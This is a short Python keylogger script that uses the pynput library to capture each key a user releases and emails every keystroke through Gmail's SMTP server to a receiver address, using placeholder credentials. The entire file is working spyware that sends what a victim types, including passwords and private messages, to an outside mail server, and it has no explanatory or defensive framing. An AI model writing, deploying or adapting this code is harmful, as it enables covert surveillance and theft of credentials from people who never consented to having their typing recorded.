#!/bin/python3
from pynput import keyboard
import smtplib


gmail_user = 'your-testing-mail@gmail.com'
gmail_password = 'password'

sent_from = gmail_user
to ='receiver@gmail.com'


def on_release(key):
    st=""
    st+=str(key).replace("","")
    if(str(key)=="Key.esc"):
    	return False
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(gmail_user, gmail_password)
        server.sendmail(gmail_user, to, st)
        server.close()
    except:
        print("wrong")

with keyboard.Listener(on_release=on_release) as listener:
    listener.join()
